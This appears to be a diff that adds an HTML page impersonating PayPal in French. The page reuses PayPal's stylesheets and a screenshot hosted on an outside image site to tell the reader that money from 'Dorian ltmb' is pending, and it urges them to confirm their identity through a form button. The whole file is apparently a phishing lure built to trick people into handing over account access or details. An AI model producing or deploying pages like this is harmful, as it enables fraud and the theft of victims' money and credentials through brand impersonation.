@@ -1,0 +1,31 @@
+<html lang="fr" data-reactroot="">
+ <head> 
+  <link rel="stylesheet" href="https://www.paypalobjects.com/ui-web/vx-pattern-lib/2-0-5/paypal-sans.css">
+  <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/3b9/ff4ef87559b8ee59894bf2aecd489/css/main.ltr.css">
+  <title>PayPal&nbsp;: Portefeuille</title> 
+ </head>
+ <center><body class="vx_root vx_addFlowTransition">
+  <div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen modal-flow" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader" role="main">
+   <div class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper elementDirection vx_modal-wrapper_" tabindex="-1">
+    	   <div class="vx_modal-content">
+    	<img src="https://i.ibb.co/KjRF0wy/Screenshot-20211226-182135-Chrome.jpg" width="156">
+       <h2 class="vx_text-2" id="js_modalHeader"><b>Vous Avez reçu de l'argent de Dorian ltmb.</b></h2><p><h3>Confirmez qu'il s'agit bien de vous.</h3></p>
+       <div class="vx_text-6 fiChoice-info">
+       	<p>Vous ne voyez pas l'argent sur votre compte ? </p>
+        Ce paiement étant en attente, il a donc été obtenu du compte de l'acheteur et placé sur notre compte transitoire le temps pour nous valider la transaction en cours. Nous l'utiliserons pour vos achats en ligne et l'envoi de paiements pour des biens et services.
+       </div>
+       <div class="vx_text-6">
+        <a data-name="choiceLearnMore" class="vx_anchor-small" pa-marked="1">En savoir plus sur les préférences de paiement</a>
+       </div>
+       <form action="/myaccount/money" method="POST">
+        <ul class="table-container newChoiceFi-container"></ul>
+        <button type="submit" data-testid="button-submit" name="choiceSelectSubmit" data-track="null" class="btn vx_btn vx_btn-block newChoiceFi-next test_newChoiceConfirm " title="" pa-marked="1">Confirmer</button>
+       </form>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div> 
+  <iframe id="grcv3enterpriseframe" src="https://www.paypalobjects.com/web/res/665/c7ce9a364a0f45293a9e2b00f229c/recaptcha/grcenterprise_v3.html" sandbox="allow-same-origin allow-scripts allow-popups" style="position: fixed; bottom: 30px; right: 1.5px; width: 74px; transition: width 0.3s ease 0s; height: 66px; border: 0px; z-index: 2147483000; display: none;"></iframe></center> 
+ </body>
+</html>
